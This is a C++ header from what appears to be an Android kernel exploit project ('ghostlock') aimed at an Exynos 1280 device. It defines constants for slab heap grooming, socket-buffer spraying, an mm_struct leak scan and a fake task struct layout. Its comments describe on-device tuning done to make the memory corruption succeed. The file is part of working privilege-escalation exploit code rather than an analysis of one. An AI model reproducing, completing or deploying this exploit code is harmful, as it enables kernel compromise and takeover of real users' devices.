#ifndef GHOSTLOCK_KERNEL_CONSTANTS_HPP
#define GHOSTLOCK_KERNEL_CONSTANTS_HPP

#include <cstdint>

#include "kernel/offset.h"

/* glibc's <bits/page_size.h> (NDK r27 and newer) defines PAGE_SIZE as a macro.
 * Without this, any translation unit that pulls a libc header before this one
 * turns the constant below into `inline constexpr 4096 = ...`, which is a hard
 * compile error. The kernel-side constant is authoritative here; the libc macro
 * is not used by this codebase. */
#ifdef PAGE_SIZE
#undef PAGE_SIZE
#endif

namespace ghostlock::kernel {
    inline constexpr unsigned PAGE_SHIFT = 12;
    inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
    inline constexpr unsigned KS_PAGE_SIZE = 4096;
    inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;

    inline constexpr long long SKB_DATA_DELTA = -0xe80LL;
    inline constexpr unsigned long MM_STRUCT_SZ = 0x500;

    inline constexpr unsigned MM_ORDER = 3;
    inline constexpr unsigned MM_PARTIALS = 5;

    inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;

    /* Reclaim driver geometry for the mm_struct group hunt.
     *
     * PAGE_SCAN_MAX caps how many times the group hunt re-runs before giving
     * up. DMA32_SKIP_SLABS is how many slab-batches of references are held
     * when a DMA32 candidate appears -- on this device DMA32 does not reclaim
     * into the SKB path reliably, so candidates there are held and discarded
     * rather than used. TRIGGER_SLABS is the drain pressure applied before the
     * target slab's tail is released: without that pressure the slab is not
     * actually freed and the scan has nothing to find.
     *
     * Declared unconditionally so support/a53_reclaim.cpp compiles on every
     * target; only the A53 build ever calls it.
     *
     * See docs/development/a53-reclaim-port-plan.md. */
    inline constexpr unsigned long A53_PAGE_SCAN_MAX = 256;
    inline constexpr unsigned long A53_DMA32_SKIP_SLABS = 8;
    inline constexpr unsigned long A53_TRIGGER_SLABS = 24;

#if defined(GHOSTLOCK_TARGET_A53_5_10)
    /* Exynos 1280 only reclaims the mm_struct slab once the socket buffer
     * spans enough order-3 slabs to cover it, and the reclaim loop has to run
     * that many times. Upstream measured 256 slabs / 256 sends on this SoC.
     *
     * With the generic 2-slab / 4-send values the slab is never freed, so the
     * mm_struct scan has nothing to match and every heap-preparation attempt
     * fails with "mm_struct leaked=0xffffffffffffffff" -- which is what a real
     * run on this device did before this branch existed. */
    /* Upstream raises the send COUNT on this SoC, not the per-send SIZE:
     * SKB_SEND_SIZE stays two order-3 slabs (64 KiB) and the socket gets
     * SKB_RECLAIM_SENDS attempts.
     *
     * Sizing the single send up instead (ORDER3_SIZE * 256) deadlocks it.
     * prepare_kernel_page's shaping sendmsg() is blocking and its peer end is
     * never drained, so it parks in sock_wait_for_wmem forever -- confirmed on
     * device: the run reached the group reclaim, freed the slab, then hung at
     * 0% CPU in sendto() with wchan=sock_wait_for_wmem. */
    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
    inline constexpr unsigned long SKB_RECLAIM_SENDS = 256;
#else
    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
    inline constexpr unsigned long SKB_RECLAIM_SENDS = 4;
#endif
    inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
    inline constexpr int32_t SKB_FRAG_BIAS = 0;

    inline constexpr int32_t FAKE_TASK_PRIO = 120;
    inline constexpr int32_t FAKE_WAITER_PRIO = 140;
    inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
    inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
    inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
    inline constexpr unsigned FAKE_UCLAMP_MIN_ACTIVE = 1U << FAKE_UCLAMP_ACTIVE_BIT;
    inline constexpr unsigned FAKE_UCLAMP_MAX_ACTIVE =
            (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT));

    inline constexpr unsigned TASK_COMM_LEN = 16;

    /* `select_stack_route.h` keeps a host-safe fallback macro under this name, so a
 * TU that includes it before common.h must not also declare the constexpr. */
#ifndef PSELECT_ROUTE_NFDS
    inline constexpr unsigned PSELECT_ROUTE_NFDS = 320;
#endif
    inline constexpr int32_t PSELECT_CONSUMER_NICE = 19;
    inline constexpr unsigned PSELECT_CONSUMER_SETTLE_USEC = 250000;

    struct local_sched_attr {
        uint32_t size;
        uint32_t sched_policy;
        uint64_t sched_flags;
        int32_t sched_nice;
        uint32_t sched_priority;
        uint64_t sched_runtime;
        uint64_t sched_deadline;
        uint64_t sched_period;
    };

    /* Measured direct-map end (defaults to the built-in bound). */
    extern uint64_t g_direct_map_end;
} // namespace ghostlock::kernel

#endif
